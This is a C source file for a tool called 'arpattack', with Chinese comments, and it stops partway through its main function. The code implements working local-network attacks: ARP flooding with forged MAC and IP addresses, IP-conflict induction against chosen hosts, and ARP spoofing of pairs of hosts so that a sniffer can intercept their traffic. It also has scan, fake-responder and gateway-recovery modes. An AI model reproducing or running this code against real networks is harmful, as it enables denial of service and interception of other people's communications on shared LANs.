#include "selfdefine.h"
#include "arpattack.h"
#include "unpifi.h"
#include "jhash.h"

/*命令行中所对应的长选项*/
static struct	option	longopts[]=
{
	{"hosts", required_argument, NULL, 'h'},
	{"type", required_argument, NULL, 't'},
	{"sniffer", required_argument, NULL, 's'},
	{"exclusive", required_argument, NULL, 'e'},
	{"interface", required_argument, NULL, 'i'},
	{"number",required_argument,NULL,'n'},
	{"one_end",required_argument,NULL,'o'},
	{"another_end",required_argument,NULL,'a'},
	{"match",required_argument,NULL,'m'},	
	{"timeslot",required_argument,NULL,'l'},
	{0, 0, 0, 0}
};

/* Table of legal combinations of types and options.  If any of the
 * given types make an option legal, that option is legal.
 * Key:
 *  +  compulsory
 *  x  illegal
 *     optional
 */
/*命令与选项之间的匹配*/
static char types_v_options[NUMBER_OF_TYPE][NUMBER_OF_OPT] =
{
                    /* -l   -e   -i   -s   -o   -a   -m   -n   -h*/
/*TYPE_ARPFLOOD*/  {' ',' ','+','x','x','x','x',' ',' '},
/*TYPE_IPCONFLICT*/ {' ',' ','+','x','x','x','x','x',' '},
/*TYPE_SNIFFER*/    {' ',' ','+',' ',' ',' ','x','x','x'},
/*TYPE_ARPDECEIVE*/{' ',' ','+',' ','+','+','x','x','x'},
/*TYPE_RECOVER*/   {' ',' ','+','x','x','x','x','x',' '},
/*TYPE_VM*/        {' ','x','+','x','x','x',' ','x','x'},
/*TYPE_SCAN*/	   {'x',' ','+','x','x','x','x','x',' '}
};
static const char optflags[NUMBER_OF_OPT]
= {'l', 'e', 'i', 's', 'o', 'a','m','n','h'};
static	struct ipmac **hashtable;
static int bigendian=0;
static unsigned int hashsize=0;
struct in_addr localaddr;
char haddr[IFI_HADDR];

unsigned int hash_size(unsigned int number){
	unsigned int a;

	a=number/256;
	if(!a)/*number<256*/
		return(number);
	if(a>4096)
		return(4096);
	return(a);
}

void create_hashtable(unsigned int hashsize)
{
	if(!hashsize)
		err_quit("the hash size you specified is zero!");
	hashtable=(struct ipmac **)Malloc(hashsize*sizeof(struct ipmac *));
	memset(hashtable,0,hashsize*sizeof(struct ipmac *));
}

u_int32_t get_hashvalue(u_int32_t ip)
{
	if(hashsize)
		return jhash_1word(ip,0)%hashsize;
	err_quit("You didn't alloc the hashtable!");
	return -1;
}

static int parsetype(char *str)
{
	if(!strcmp(str,"scan"))
		return(TYPE_SCAN);
	if(!strcmp(str,"arpflood"))
		return(TYPE_ARPFLOOD);
	if(!strcmp(str,"ipconflict"))
		return(TYPE_IPCONFLICT);
	if(!strcmp(str,"sniffer"))
		return(TYPE_SNIFFER);
	if(!strcmp(str,"arpdeceive"))
		return(TYPE_ARPDECEIVE);
	if(!strcmp(str,"recover"))
		return(TYPE_RECOVER);
	if(!strcmp(str,"vm"))
		return(TYPE_VM);
	return(-1);
}

/*根据命令行中指定的攻击类型和选项来判断其合法性*/
static void
generic_opt_check(int type, int options)
{
	int i, j;

	for (i = 0; i < NUMBER_OF_OPT; i++) {
		for (j = 0; j < NUMBER_OF_TYPE; j++) {
			if (!(type & (1<<j)))
				continue;

			if (!(options & (1<<i))) {
				if (types_v_options[j][i] == '+')
					err_quit("You need to supply the `-%c' "
						   "option for this arpattack type",
						   optflags[i]);
			} else 
				if (types_v_options[j][i] == 'x')
					err_quit("You can't supply the `-%c' "
						   "option for this arpattack type",
						   optflags[i]);
		}
	}
}

static inline void isbigendian()
{
	int	a=1;
	if(*((char *)&a)!=1)
		bigendian=1;
}

/*将二进制IP地址高低位对换*/
static void	swap(u_int32_t *ipaddr)
{
	/*	
		char	t;
		int	i,j=sizeof(u_int32_t)/2,k=sizeof(u_int32_t);		

		for(i=0; i<j; i++)
		{
			t=*((char *)ipaddr+i);
			*((char *)ipaddr+i)=*((char *)ipaddr+k-i-1);	
			*((char *)ipaddr+k-i-1)=t;	
		}
	*/
	if(!bigendian)
		*ipaddr=htonl(*ipaddr);
	return;
}

int compar(const void *a, const void *b)
{
	u_int32_t *aa=(u_int32_t *)a,*bb=(u_int32_t *)b;

	if(*aa>*bb) return 1;
	if(*aa==*bb) return 0;
	if(*aa<*bb) return -1;	
}

/*
	给定ip地址及其掩码，计算出ip地址范围，这里没有ip地址及其
	掩码的错误检验机制。计算出的ip地址范围不包含网络地址与
	广播地址，所以startip应为网络地址加1，startip+incre+1为其网络广播地址。
*/
static void	cmpipaddr(u_int32_t ipaddr, u_int32_t netmask, u_int32_t *startip, u_int32_t *incre)
{
	u_int32_t	i=0,j;

	swap(&ipaddr);
	swap(&netmask);

	j=netmask;
	if(netmask==IN_ADDR_BROADCAST)
	{
		*startip=ipaddr;
		*incre=0;
		swap(&ipaddr);
		swap(startip);
		return;
	}	
	
	while((netmask&1)==0)
	{	
		netmask>>=1;
		i++;
	}
	netmask=j;
	*startip=(ipaddr&netmask);
	*incre=(1<<i)-2;

	swap(&ipaddr);
	swap(&netmask);
	swap(startip);
}

static void cmpipaddr2(u_int32_t ipaddr, u_int32_t netmask, u_int32_t *startip, u_int32_t *endip)
{
	u_int32_t incre;

	cmpipaddr(ipaddr,netmask,startip,&incre);
	swap(startip);
	*endip=*startip+incre;
	swap(startip);
	swap(endip);
}

static int parse_hosts(char *hoststr, u_int32_t *hoststart, u_int32_t *hostend, u_int32_t *hosts, int *hosts_number)
{
	char patterstr[]=",/~",*ptr,*str;
	unsigned int nsaddrs = 0;
	struct in_addr *saddrs = NULL,snetmask;
	u_int32_t incre,startip,*t,*t1;
	int i;

	*hoststart=*hostend=0;
	if(hosts_number)
		*hosts_number=0;
	ptr=strpbrk(hoststr, patterstr);
	if(!ptr){
		if(!inet_aton(hoststr,(struct in_addr *)hoststart))
			return(-1);
		*hostend=*hoststart;
		return(0);
	}
	switch(*ptr){
		case '~':
			*ptr='\0';
			ptr++;
			if(!inet_aton(hoststr,(struct in_addr *)hoststart)||
				!inet_aton(ptr,(struct in_addr *)hostend))
				return(-1);
			swap(hoststart);
			swap(hostend);
			if(*hostend<*hoststart)
				err_quit("The second host ip address must be bigger that the first");
			swap(hoststart);
			swap(hostend);
			break;
		case '/':
			parse_hostnetworkmask(hoststr, &saddrs, &snetmask, &nsaddrs);
			cmpipaddr(saddrs->s_addr,snetmask.s_addr,&startip,&incre);
			*hoststart=startip;
			swap(hoststart);
			*hostend=*hoststart+incre;
			swap(hoststart);
			swap(hostend);
			break;
		case ',':
			t=hosts;
			*(ptr++)='\0';
			if(!inet_aton(hoststr,(struct in_addr *)(hosts++)))
				return(-1);
			(*hosts_number)++;
			str=ptr;
			while((ptr=strchr(str,','))||str){
				if(ptr)
					*(ptr++)='\0';
				if(!inet_aton(str,(struct in_addr *)hosts))
					return(-1);
				t1=t;
				for(i=0;i<*hosts_number;i++)
					if(*(t1++)==*hosts)
						break;
				if(i==*hosts_number){
					(*hosts_number)++;
					hosts++;
				}
				str=ptr;
				if(!str)
					break;
			}
			break;
	}
	return(0);
}

static struct vm *parse_match(char *matchstr)
{
	struct vm *vmhead=NULL,*temp,**pre;
	char *start,*end,*comma;

	pre=&vmhead;
	start=matchstr;
reparse:	
	while(*start!='\0'&&(*start==' '||*start==','))
		start++;
	if(*start!='\0'&&*start!='(')
		err_quit("The match string you specify is invalid!");
	if(*start=='\0')
		return vmhead;
		
	if((end=strchr(start,')'))==NULL)
		err_quit("The match string you specify is invalid!");
	if((comma=strchr(start,','))==NULL)
		err_quit("You must specify the comma in the brackets!");
	*comma='\0';
	temp=(struct vm *)Malloc(sizeof(struct vm));
	memset(temp,0,sizeof(struct vm));
	if(parse_hosts(start+1,&temp->hoststart,&temp->hostend,NULL,NULL)<0)
		err_quit("the specified host address is wrong!");
	*end='\0';
	if(getMAC(comma+1, temp->haddr, IFI_HADDR)<0)
		err_quit("The mac address you specify is invalid!");
	*pre=temp;
	pre=&temp->next;
	start=end+1;
	goto reparse;
}

static struct in_addr get_interface_info(char *ifname,char *haddr,int *hlen,
										struct in_addr *netmask,int *ifindex)
{
		struct ifi_info *ifi, *ifihead;
		int 			i;
	
		for (ifihead = ifi = Get_ifi_info(AF_INET, 0);
			 ifi != NULL; ifi = ifi->ifi_next) {
#ifdef DEBUG
			fprintf(stdout,"interface=%s\n",ifi->ifi_name);
			fprintf(stdout,"mtu=%d\n",ifi->ifi_mtu);
			fprintf(stdout,"hardware type=%u\n",ifi->ifi_hatype);
			fprintf(stdout,"hardware address=");
			for(i=0;i<ifi->ifi_hlen;i++)
				fprintf(stdout,"%x:",*(ifi->ifi_haddr+i));
			fprintf(stdout,"\n");
			fprintf(stdout,"header len=%u\n",ifi->ifi_hlen);
			if(ifi->ifi_addr)
				fprintf(stdout,"ip address=%s\n",inet_ntoa(((struct sockaddr_in *)(ifi->ifi_addr))->sin_addr)); 
			if(ifi->ifi_netmask)
				fprintf(stdout,"netmask=%s\n",inet_ntoa(((struct sockaddr_in *)(ifi->ifi_netmask))->sin_addr));
			if(ifi->ifi_brdaddr)
				fprintf(stdout,"broad address=%s\n",inet_ntoa(((struct sockaddr_in *)(ifi->ifi_brdaddr))->sin_addr));
			if(ifi->ifi_dstaddr)
				fprintf(stdout,"dst address=%s\n",inet_ntoa(((struct sockaddr_in *)(ifi->ifi_dstaddr))->sin_addr));
			fprintf(stdout,"interface index=%d\n",ifi->ifi_index);	
			fprintf(stdout,"\n");
#endif
			if(!ifname||strcmp(ifname,ifi->ifi_name))
				continue;
			if ( (i = ifi->ifi_hlen) > 0) {
				if(hlen)
					*hlen=ifi->ifi_hlen;
				if(haddr)
					memcpy(haddr,ifi->ifi_haddr,ifi->ifi_hlen);
				if(netmask)
					*netmask=((struct sockaddr_in *)(ifi->ifi_netmask))->sin_addr;
				if(ifindex)
					*ifindex=ifi->ifi_index;
				return(((struct sockaddr_in *)(ifi->ifi_addr))->sin_addr);
			}
		}
		free_ifi_info(ifihead);
		return((struct in_addr){0});
	}

void send_arppacket(unsigned char hlen, unsigned short arpop,char *sha,char *dha,
                         u_int32_t sip,u_int32_t dip,int ifindex,unsigned char broadcast)
{
		int sockfd;
		struct sockaddr_ll shaddr,dhaddr;
		struct arphdr *arpheader;
		struct ethhdr *ethheader;/*以太网首部*/
		char dha2[IFI_HADDR]={0xff,0xff,0xff,0xff,0xff,0xff,'\0'};
	
		sockfd=Socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	
		memset(&shaddr,0,sizeof(struct sockaddr_ll));
		shaddr.sll_family=AF_PACKET;
		shaddr.sll_protocol=htons(ETH_P_ARP);
		shaddr.sll_ifindex=ifindex;
		shaddr.sll_hatype=ARPHRD_ETHER;/*以太网*/
	
		Bind(sockfd,(struct sockaddr *)&shaddr,sizeof(struct sockaddr_ll));
	
		memset(&dhaddr,0,sizeof(struct sockaddr_ll));
		dhaddr.sll_family=AF_PACKET;
		dhaddr.sll_protocol=htons(ETH_P_ARP);
		dhaddr.sll_ifindex=ifindex;
		dhaddr.sll_hatype=ARPHRD_ETHER;
		/*下面构造链路层首部,目前只支持IEEE 802.3以太网*/
		ethheader=(struct ethhdr *)Malloc(sizeof(struct ethhdr)+sizeof(struct arphdr)+2*(hlen+4));
		if(broadcast)
			memcpy(ethheader->h_dest,dha2,hlen);
		else
			memcpy(ethheader->h_dest,dha,hlen);		
		memcpy(ethheader->h_source,sha,hlen);
		ethheader->h_proto=htons(ETH_P_ARP);
		
		arpheader=(struct arphdr *)(ethheader+1);
		arpheader->ar_hrd=htons(ARPHRD_ETHER);
		arpheader->ar_pro=htons(ETH_P_IP);
		arpheader->ar_hln=hlen;
		arpheader->ar_pln=4;
		arpheader->ar_op=htons(arpop);
	//#ifdef DEBUG
	//	print(sip);
	//	print(dip);
	//#endif
		memcpy(arpheader+1, sha, hlen);
		memcpy((char *)(arpheader+1)+hlen, (char *)&sip, 4);
		if(arpop==ARPOP_REQUEST)
			memset((char *)(arpheader+1)+hlen+4, 0, hlen);
		if(arpop==ARPOP_REPLY)
			memcpy((char *)(arpheader+1)+hlen+4, dha, hlen);		
		memcpy((char *)(arpheader+1)+2*hlen+4, (char *)&dip, 4);
	//#ifdef DEBUG
	//	print((u_int32_t *)((char *)(arpheader+1)+hlen));
	//#endif
		Sendto(sockfd, ethheader, sizeof(struct ethhdr)+sizeof(struct arphdr)+2*(hlen+4), 0, 
				(struct sockaddr *)&dhaddr, sizeof(struct sockaddr_ll));
		Close(sockfd);
}

static inline int in_exclusive(u_int32_t host, u_int32_t ehoststart, u_int32_t ehostend,
									u_int32_t *ehosts, int ehosts_number)
{
	int i;
	
	if(!ehosts_number)
		return(host>=ehoststart&&host<=ehostend);

	swap(&host);
	for(i=0;i<ehosts_number;i++){
		if(host<*(ehosts+i))
			return 0;
		if(host==*(ehosts+i))
			return 1;
	}
	return 0;
}

static int
in_vm(struct vm *vmhead, u_int32_t ip, char *sha)
{
	struct vm *temp;

	swap(&ip);
	temp=vmhead;
	while(temp){
		if(ip>=temp->hoststart&&ip<=temp->hostend){
			memcpy(sha,temp->haddr,IFI_HADDR);
			return(1);
		}
		temp=temp->next;
	}
	return(0);
}

static int 
find_hashnode(struct ipmac *ipmac,int hlen)
{
	struct ipmac **tmp;	
	struct ipmac *a;
	u_int32_t n;
		
	n=get_hashvalue(ipmac->ipaddr.s_addr);
	tmp=hashtable+n;
	while(*tmp){
		struct ipmac *t;
	
		t=*tmp;
		if((t->ipaddr.s_addr==ipmac->ipaddr.s_addr))
			return(1);		
		tmp=&(t->next);
	}
//	printf("%s:%d\n",inet_ntoa(*((struct in_addr *)&ip)),ntohs(port));	
//	fflush(stdout);
	a=(struct ipmac *)Malloc(sizeof(struct ipmac));
	a->ipaddr=ipmac->ipaddr;
	memcpy(a->haddr,ipmac->haddr,hlen);
	a->next=NULL;
	(*tmp)=a;
	return(0);
}

/*根据ip地址在ip-mac映射表中寻找其对应的mac地址,
   若未找到返回-1,否则返回1*/
static int
getmac(u_int32_t ipaddr, char *haddr, int hlen)
{
	u_int32_t n;
		
	n=get_hashvalue(ipaddr);
	struct ipmac *listhead=*(hashtable+n);

	while(listhead){
		if(listhead->ipaddr.s_addr==ipaddr){
			memcpy(haddr,listhead->haddr,hlen);
			return(1);
		}			
		listhead=listhead->next;
	}
	return(-1);
}

static void *
getipmac(void *ifindex)
{
	struct sockaddr_ll shaddr;
	char buff[100];	
	int sockfd,len;
	
	sockfd=Socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	
	memset(&shaddr,0,sizeof(struct sockaddr_ll));
	shaddr.sll_family=AF_PACKET;
	shaddr.sll_protocol=htons(ETH_P_ARP);
	shaddr.sll_ifindex=*((int *)ifindex);
	shaddr.sll_hatype=ARPHRD_ETHER;/*以太网*/
	shaddr.sll_pkttype=PACKET_HOST;
	Bind(sockfd,(struct sockaddr *)&shaddr,sizeof(struct sockaddr_ll));

	while((len=Recvfrom(sockfd,buff,sizeof(buff),0,NULL,0))>0){
		struct arphdr *arpheader;
		int hlen;
		unsigned short op;
		struct ipmac ipmac;
			
		if(len<sizeof(struct arphdr))
			continue;
		arpheader=(struct arphdr *)buff;
		op=ntohs(arpheader->ar_op);
		if(op!=ARPOP_REPLY)
			continue;
		hlen=arpheader->ar_hln;
		if(len<sizeof(struct arphdr)+2*(hlen+4))
			continue;
		memcpy(ipmac.haddr,arpheader+1, hlen);
		ipmac.ipaddr=*((struct in_addr *)((char *)(arpheader+1)+hlen));
		find_hashnode(&ipmac,hlen);
	}
}

static void *
vm_response(void *vmparam)
{
	struct vm *vmhead;
	int ifindex,sockfd,len;
	struct sockaddr_ll shaddr;
	char buff[100],sha[IFI_HADDR],dha[IFI_HADDR]; 

	vmhead=((struct pthread_vm_param *)vmparam)->vmhead;
	ifindex=((struct pthread_vm_param *)vmparam)->ifindex;
	
	sockfd=Socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));

	memset(&shaddr,0,sizeof(struct sockaddr_ll));
	shaddr.sll_family=AF_PACKET;
	shaddr.sll_protocol=htons(ETH_P_ARP);
	shaddr.sll_ifindex=ifindex;
	shaddr.sll_hatype=ARPHRD_ETHER;/*以太网*/
	shaddr.sll_pkttype=PACKET_HOST;
	Bind(sockfd,(struct sockaddr *)&shaddr,sizeof(struct sockaddr_ll));
	
	while((len=Recvfrom(sockfd,buff,sizeof(buff),0,NULL,0))>0){
		struct arphdr *arpheader;
		int hlen;
		unsigned short op;
		u_int32_t arpsrc,arpdst;
			
		if(len<sizeof(struct arphdr))
			continue;
		arpheader=(struct arphdr *)buff;
		op=ntohs(arpheader->ar_op);
		if(op!=ARPOP_REQUEST)
			continue;
		hlen=arpheader->ar_hln;
		if(len<sizeof(struct arphdr)+2*(hlen+4))
			continue;
		memcpy(dha,arpheader+1,IFI_HADDR);
		arpsrc=*((u_int32_t *)((char *)(arpheader+1)+hlen));
		arpdst=*((u_int32_t *)((char *)(arpheader+1)+2*hlen+4));
#ifdef VMDEBUG
{
		char str[100];
		
		fprintf(stdout,"src=%s,",inet_ntoa(*((struct in_addr *)(&arpsrc))));
		fprintf(stdout,"dst=%s,",inet_ntoa(*((struct in_addr *)(&arpdst))));
		printMAC(str,dha,6);
		fprintf(stdout,"src mac=%s\n",str);
		fflush(stdout);
}
#endif
		if(in_vm(vmhead,arpdst,sha))
			send_arppacket(hlen,ARPOP_REPLY,sha,dha,arpdst,arpsrc,ifindex,0);
	}
	
}
static void 
printipmac(int hlen)
{
	int i;
	char macstr[50];
	
	for(i=0;i<hashsize;i++){
		struct ipmac *listhead=*(hashtable+i);
#ifdef HASHCONFLICT
		if(listhead)
			fprintf(stdout,"%d	",i);
#endif
		while(listhead){
			fprintf(stdout,"%-20s:",inet_ntoa(listhead->ipaddr));
			printMAC(macstr,listhead->haddr,hlen);
			fprintf(stdout,"%s\n",macstr);
			listhead=listhead->next;
		}
	}
}

static void hostscan(u_int32_t hoststart, u_int32_t hostend, u_int32_t *hosts, int hosts_number,
                       u_int32_t ehoststart, u_int32_t ehostend, u_int32_t *ehosts, int ehosts_number,
                       unsigned char hlen, char *haddr,u_int32_t localaddr,int ifindex)
{
	int count,size;
	pthread_t tid;

	if(hosts_number)
		size=hosts_number;
	else{
		swap(&hoststart);
		swap(&hostend);
		size=hostend-hoststart+1;
	}
	hashsize=hash_size(size);
	create_hashtable(hashsize);
	if(pthread_create(&tid,NULL,getipmac,&ifindex))
		err_quit("pthread_create error!");
	sleep(1);
	for(count=1;count<2;count++){
		swap(&ehostend);	
		swap(&ehoststart);
		if(hoststart){
			for(;hoststart<=hostend;hoststart++){
				if(in_exclusive(hoststart, ehoststart, ehostend, ehosts, ehosts_number))
					continue;
				swap(&hoststart);
#ifdef DEBUG
				fprintf(stdout,"%s,",inet_ntoa(*((struct in_addr *)&hoststart)));
#endif		
				send_arppacket(hlen, ARPOP_REQUEST, haddr, NULL, localaddr, hoststart, ifindex, 1);
				swap(&hoststart);
			}
		}
		else{
			int i;

			for(i=0;i<hosts_number;i++){
				hoststart=*(hosts+i);
				swap(&hoststart);
				if(in_exclusive(hoststart, ehoststart, ehostend, ehosts, ehosts_number))
					continue;
				swap(&hoststart);
#ifdef DEBUG
				fprintf(stdout,"%s,",inet_ntoa(*((struct in_addr *)&hoststart)));
#endif	
				send_arppacket(hlen, ARPOP_REQUEST, haddr, NULL, localaddr, hoststart, ifindex, 1);
			}
		}
		sleep(2);
	}
}

static void ipconflict(u_int32_t hoststart, u_int32_t hostend, u_int32_t *hosts, int hosts_number,
					u_int32_t ehoststart,u_int32_t ehostend, u_int32_t *ehosts, int ehosts_number,
                       unsigned char hlen, int ifindex)
{
	char dhaddr[IFI_HADDR];
	char haddr[IFI_HADDR]={0x00,0x13,0x7f,0x60,0x5a,0xff,'\0'};/*伪造源物理地址*/

	swap(&ehostend);	
	swap(&ehoststart);
	if(hoststart){
		for(swap(&hoststart),swap(&hostend);hoststart<=hostend;hoststart++){
			if(in_exclusive(hoststart, ehoststart, ehostend, ehosts, ehosts_number))
				continue;
			swap(&hoststart);
			if(getmac(hoststart,dhaddr,hlen)<0){				
				swap(&hoststart);
				continue;	
			}
			send_arppacket(hlen, ARPOP_REPLY, haddr, dhaddr, hoststart, hoststart, ifindex, 0);
			swap(&hoststart);
		}
	}
	else{
		int i;

		for(i=0;i<hosts_number;i++){
			hoststart=*(hosts+i);
			swap(&hoststart);
			if(in_exclusive(hoststart, ehoststart, ehostend, ehosts, ehosts_number))
				continue;
			swap(&hoststart);
			if(getmac(hoststart,dhaddr,hlen)<0){
				swap(&hoststart);
				continue;
			}
			send_arppacket(hlen, ARPOP_REPLY, haddr, dhaddr, hoststart, hoststart, ifindex, 0);			
		}
	}
}

static void 
arpflood(u_int32_t hoststart, u_int32_t hostend, u_int32_t *hosts, int hosts_number,u_int32_t ehoststart,
           	           u_int32_t ehostend, u_int32_t *ehosts, int ehosts_number,
                       unsigned char hlen, int ifindex,int number)
{
	char dhaddr[IFI_HADDR];
	char haddr[IFI_HADDR]={0x00,0x11,0x7f,0x60,0x5a,0xff,'\0'};/*伪造源物理地址*/
	struct in_addr shoststart;
	u_int32_t shostend,thoststart,thostend;

	inet_aton("202.119.0.0",&shoststart);/*伪造的源ip地址*/
	swap(&shoststart.s_addr);
	shostend=shoststart.s_addr+number-1;

	thoststart=hoststart;
	thostend=hostend;
	
	swap(&ehostend);	
	swap(&ehoststart);
	for(;shoststart.s_addr<=shostend;shoststart.s_addr++){
		swap(&shoststart.s_addr);
		
		if(hoststart){			
			for(swap(&hoststart),swap(&hostend);hoststart<=hostend;hoststart++){
				if(in_exclusive(hoststart, ehoststart, ehostend, ehosts, ehosts_number))
					continue;
				swap(&hoststart);
				if(getmac(hoststart,dhaddr,hlen)<0){
					swap(&hoststart);					
					continue;
				}
				send_arppacket(hlen, ARPOP_REQUEST, haddr, dhaddr, shoststart.s_addr, hoststart, ifindex, 0);
				send_arppacket(hlen, ARPOP_REPLY, haddr, dhaddr, shoststart.s_addr, hoststart, ifindex, 0);
				swap(&hoststart);
			}
		}
		else{
			int i;
	
			for(i=0;i<hosts_number;i++){
				hoststart=*(hosts+i);
				swap(&hoststart);
				if(in_exclusive(hoststart, ehoststart, ehostend, ehosts, ehosts_number))
					continue;
				swap(&hoststart);
				if(getmac(hoststart,dhaddr,hlen)<0){
					swap(&hoststart);
					continue;
				}
				send_arppacket(hlen, ARPOP_REQUEST, haddr, dhaddr, shoststart.s_addr, hoststart, ifindex, 0);				
				send_arppacket(hlen, ARPOP_REPLY, haddr, dhaddr, shoststart.s_addr, hoststart, ifindex, 0);			
			}
		}/*end else*/
		hoststart=thoststart;
		hostend=thostend;
		swap(&shoststart.s_addr);
	}
}

static void
sniffer2(unsigned char hlen, int ifindex,u_int32_t ip1,u_int32_t ip2,char *shaddr,int snifferflag)
{
	char dhaddr1[IFI_HADDR],dhaddr2[IFI_HADDR];

	if(getmac(ip1,dhaddr1,hlen)<0)
		return;
	if(snifferflag&&getmac(ip2,dhaddr2,hlen)<0)
		return;
	send_arppacket(hlen, ARPOP_REQUEST, shaddr, dhaddr1,ip2, ip1, ifindex, 0);
	send_arppacket(hlen, ARPOP_REPLY, shaddr, dhaddr1,ip2, ip1, ifindex, 0);
	if(snifferflag){/*若攻击类型为sniffer,则两边都需要发送伪造ARP数据包*/
		send_arppacket(hlen, ARPOP_REQUEST, shaddr, dhaddr2,ip1, ip2, ifindex, 0);
		send_arppacket(hlen, ARPOP_REPLY, shaddr, dhaddr2,ip1, ip2, ifindex, 0);	
	}
}

static void
sniffer3(u_int32_t ip1,unsigned char hlen, int ifindex,char *shaddr,
         u_int32_t ahoststart, u_int32_t ahostend, u_int32_t *ahosts, int ahosts_number,
         u_int32_t ehoststart,u_int32_t ehostend, u_int32_t *ehosts, int ehosts_number, int snifferflag)
{
	if(!ahosts_number){
		for(swap(&ahoststart),swap(&ahostend);ahoststart<=ahostend;ahoststart++){
			if(in_exclusive(ahoststart, ehoststart, ehostend, ehosts, ehosts_number))
				continue;
			swap(&ahoststart);
			if(ip1==ahoststart){
				swap(&ahoststart);
				continue;
			}
			sniffer2(hlen,ifindex,ip1,ahoststart,shaddr,snifferflag);
			swap(&ahoststart);
		}/*end for(swap(&ahoststart),*/ 
	}/*end if(!ahosts_number)*/
	else{
		int i;
	
		for(i=0;i<ahosts_number;i++){
			ahoststart=*(ahosts+i);
			swap(&ahoststart);
			if(in_exclusive(ahoststart, ehoststart, ehostend, ehosts, ehosts_number))
				continue;
			swap(&ahoststart);
			sniffer2(hlen,ifindex,ip1,ahoststart,shaddr,snifferflag);
		}/*end for(i=0*/
	}/*end else*/
}

static void
Sniffer(u_int32_t ohoststart, u_int32_t ohostend, u_int32_t *ohosts, int ohosts_number,
		u_int32_t ahoststart, u_int32_t ahostend, u_int32_t *ahosts, int ahosts_number,
		u_int32_t ehoststart,u_int32_t ehostend, u_int32_t *ehosts, int ehosts_number,
        unsigned char hlen, int ifindex,u_int32_t sniffer,int snifferflag)
{
	char shaddr[IFI_HADDR]={0x00,0xe0,0x4c,0x79,0xef,0xff};/*在执行arpdeceive攻击时,若未指定-s选项
															则默认为00:e0:4c:79:ef:ff*/

	if(getmac(sniffer,shaddr,hlen)<0){
		if(snifferflag){/*snifferflag=1意味着攻击类型为sniffer*/
			if(sniffer!=localaddr.s_addr)
				err_quit("the sniffer you specify isn't running in the local network!");
			memcpy(shaddr,haddr,hlen);
		}
	}
	swap(&ehostend);	
	swap(&ehoststart);
	if(!ohosts_number){
		for(swap(&ohoststart),swap(&ohostend);ohoststart<=ohostend;ohoststart++){
			if(in_exclusive(ohoststart, ehoststart, ehostend, ehosts, ehosts_number))
				continue;
			swap(&ohoststart);
			sniffer3(ohoststart,hlen,ifindex,shaddr,ahoststart,ahostend,ahosts,ahosts_number,
						ehoststart,ehostend,ehosts,ehosts_number,snifferflag);
			swap(&ohoststart);			
		}/*end for(swap(&ohoststart),*/
	}
	else{
		int i;

		for(i=0;i<ohosts_number;i++){
			ohoststart=*(ohosts+i);
			swap(&ohoststart);
			if(in_exclusive(ohoststart, ehoststart, ehostend, ehosts, ehosts_number))
				continue;
			swap(&ohoststart);
			sniffer3(ohoststart,hlen,ifindex,shaddr,ahoststart,ahostend,ahosts,ahosts_number,
						ehoststart,ehostend,ehosts,ehosts_number,snifferflag);			
		}
	}/*end else*/
}

static void recover(u_int32_t hoststart, u_int32_t hostend, u_int32_t *hosts, int hosts_number,
                       u_int32_t ehoststart, u_int32_t ehostend, u_int32_t *ehosts, int ehosts_number,
                       unsigned char hlen, char *ifi_name)
{
	char dhaddr[IFI_HADDR];
	char ghaddr[IFI_HADDR];
	struct sockaddr_in gateway;
	struct in_addr temp;
	int ifindex;

	if(getgateway((struct sockaddr *)&gateway,ifi_name)<0)
		err_quit("there is no default gateway in the routing table!");
	if(getmac(gateway.sin_addr.s_addr,ghaddr,hlen)<0)/*获得默认网关的物理地址*/
		err_quit("can't get the mac about the default gateway!");
		
	temp=get_interface_info(ifi_name, NULL, NULL, NULL, &ifindex);
	if(!(temp.s_addr))
		err_quit("can't get the interface index of the interface %s!",ifi_name);

	swap(&ehostend);
	swap(&ehoststart);
	if(hoststart){
		for(swap(&hoststart),swap(&hostend);hoststart<=hostend;hoststart++){
			if(in_exclusive(hoststart, ehoststart, ehostend, ehosts, ehosts_number))
				continue;
			swap(&hoststart);
			if(getmac(hoststart,dhaddr,hlen)<0){				
				swap(&hoststart);
				continue;	
			}
			send_arppacket(hlen, ARPOP_REQUEST, ghaddr, dhaddr, gateway.sin_addr.s_addr, hoststart, ifindex, 0);
			send_arppacket(hlen, ARPOP_REPLY, ghaddr, dhaddr, gateway.sin_addr.s_addr, hoststart, ifindex, 0);
			send_arppacket(hlen, ARPOP_REQUEST, dhaddr, ghaddr, hoststart, gateway.sin_addr.s_addr, ifindex, 0);			
			send_arppacket(hlen, ARPOP_REPLY, dhaddr, ghaddr, hoststart, gateway.sin_addr.s_addr, ifindex, 0);
			swap(&hoststart);
		}
	}
	else{
		int i;

		for(i=0;i<hosts_number;i++){
			hoststart=*(hosts+i);
			swap(&hoststart);
			if(in_exclusive(hoststart, ehoststart, ehostend, ehosts, ehosts_number))
				continue;
			swap(&hoststart);
			if(getmac(hoststart,dhaddr,hlen)<0){
				swap(&hoststart);
				continue;
			}
			send_arppacket(hlen, ARPOP_REQUEST, ghaddr, dhaddr, gateway.sin_addr.s_addr, hoststart, ifindex, 0);
			send_arppacket(hlen, ARPOP_REPLY, ghaddr, dhaddr, gateway.sin_addr.s_addr, hoststart, ifindex, 0);
			send_arppacket(hlen, ARPOP_REQUEST, dhaddr, ghaddr, hoststart, gateway.sin_addr.s_addr, ifindex, 0);			
			send_arppacket(hlen, ARPOP_REPLY, dhaddr, ghaddr, hoststart, gateway.sin_addr.s_addr, ifindex, 0);
		}
	}
}

int
main(int argc, char *argv[])
{
	int type=0,options=0,number=0,ifindex,hlen,timeslot=0;
	u_int32_t hosts[HOSTS_NUMBER],hosts_number=0,ehosts[HOSTS_NUMBER],ehosts_number=0,
		ohosts[HOSTS_NUMBER],ohosts_number=0,ahosts[HOSTS_NUMBER],ahosts_number=0;
	char c,ifi_name[IFI_NAME];
	struct in_addr hoststart,hostend,ehoststart,ehostend,sniffer,ohoststart,ohostend,ahoststart,ahostend;
	struct in_addr netmask;
	struct sockaddr_in gateway;
	struct vm *vmhead;
	pthread_t vmtid;
	struct pthread_vm_param vmparam;
	char   helpinfo[]=
{"arpattack -t scan -i interface [-h …] [-e …]\n
arpattack -t ipconflict -i interface [-h …] [-e …] [-l …]\n
arpattack -t arpflood -i interface [-h …] [-e …] [-l …] [-n …]\n
arpattack -t sniffer -i interface [-o …] [-a …] [-e …] [-s …] [-l …]\n
arpattack -t arpdeceive -i interface -o … -a … [-e …] [-s …] [-l …]\n
arpattack -t recover -i interface [-h …] [-e …] [-l …]\n
